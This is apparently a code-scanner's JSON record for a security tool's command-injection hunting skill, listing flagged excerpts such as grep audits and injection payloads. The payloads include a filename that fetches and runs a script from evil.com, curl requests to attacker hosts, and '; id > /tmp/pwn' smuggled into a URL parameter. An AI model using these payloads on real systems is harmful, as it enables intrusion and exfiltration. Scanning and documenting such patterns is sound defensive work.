@@ -1,0 +1,137 @@
+{
+  "id": "bittersecurity__decepticon__packages~decepticon~decepticon~skills~standard~analyst~command-injection",
+  "owner": "BitterSecurity",
+  "repo": "Decepticon",
+  "path": "packages/decepticon/decepticon/skills/standard/analyst/command-injection",
+  "name": "command-injection",
+  "description": "Hunt OS command injection (CWE-78) — user input reaching shell, exec, or system calls. Covers argument-array bypasses, path confusion, and template-string injection in modern frameworks.",
+  "stars": 6567,
+  "category": "coding",
+  "commit": "df879550544d36b6b1e69062f05adae28537adf2",
+  "contentHash": "0493e72c2ac125e663cb92dfd971a628576919b83ab1c0fbbe768c91b5e273cf",
+  "repoCreatedAt": "2025-06-06T12:55:02Z",
+  "alsoFoundIn": [],
+  "status": "ok",
+  "incomplete": false,
+  "scannedAt": "2026-11-08T09:45:03.483Z",
+  "scan": {
+    "findings": [
+      {
+        "ruleId": "shell",
+        "file": "packages/decepticon/decepticon/skills/standard/analyst/command-injection/SKILL.md",
+        "line": 19,
+        "excerpt": "| Python   | `os.system`, `subprocess.Popen(..., shell=True)`, `os.popen`, `commands.getoutput` | `subprocess.run([...], shell=False)` |",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "packages/decepticon/decepticon/skills/standard/analyst/command-injection/SKILL.md",
+        "line": 20,
+        "excerpt": "| Node     | `child_process.exec`, `execSync`         | `child_process.execFile`, `spawn` (array args)     |",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "packages/decepticon/decepticon/skills/standard/analyst/command-injection/SKILL.md",
+        "line": 46,
+        "excerpt": "grep -rE 'os\\.system\\(|subprocess.*shell\\s*=\\s*True|exec\\s*\\(' /workspace/src",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "packages/decepticon/decepticon/skills/standard/analyst/command-injection/SKILL.md",
+        "line": 48,
+        "excerpt": "grep -rE 'child_process\\.(exec|execSync)\\(' /workspace/src",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "packages/decepticon/decepticon/skills/standard/analyst/command-injection/SKILL.md",
+        "line": 61,
+        "excerpt": "- **Argument injection** (the -oProxyCommand trick) — passing `-oProxyCommand=curl $(whoami).attacker.com` to ssh-based sinks",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": "packages/decepticon/decepticon/skills/standard/analyst/command-injection/SKILL.md",
+        "line": 64,
+        "excerpt": "- **Command substitution in filename** — `$(curl evil.com/x.sh | sh).jpg`",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "packages/decepticon/decepticon/skills/standard/analyst/command-injection/SKILL.md",
+        "line": 68,
+        "excerpt": "- **Git** — `git clone 'ssh://ext::sh -c whoami # foo'`",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "packages/decepticon/decepticon/skills/standard/analyst/command-injection/SKILL.md",
+        "line": 74,
+        "excerpt": "curl \"https://target.com/export?filename=; curl $(whoami).attacker.oob/\"",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "target.com"
+        ]
+      },
+      {
+        "ruleId": "shell",
+        "file": "packages/decepticon/decepticon/skills/standard/analyst/command-injection/SKILL.md",
+        "line": 74,
+        "excerpt": "curl \"https://target.com/export?filename=; curl $(whoami).attacker.oob/\"",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "packages/decepticon/decepticon/skills/standard/analyst/command-injection/SKILL.md",
+        "line": 77,
+        "excerpt": "curl \"https://target.com/export?filename=; sleep 7 #.pdf\"",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "target.com"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "packages/decepticon/decepticon/skills/standard/analyst/command-injection/SKILL.md",
+        "line": 80,
+        "excerpt": "curl \"https://target.com/export?filename=; id > /tmp/pwn #.pdf\"",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "target.com"
+        ]
+      }
+    ],
+    "findingTotals": {
+      "shell": 6,
+      "network": 4,
+      "downloads-code": 1
+    },
+    "score": 79,
+    "band": "review",
+    "rulesVersion": "1.3.0",
+    "filesScanned": 1,
+    "filesSkipped": 0
+  },
+  "history": [
+    {
+      "commit": "df879550544d36b6b1e69062f05adae28537adf2",
+      "scannedAt": "2026-11-08T09:45:03.483Z",
+      "score": 79,
+      "rulesVersion": "1.3.0"
+    }
+  ]
+}
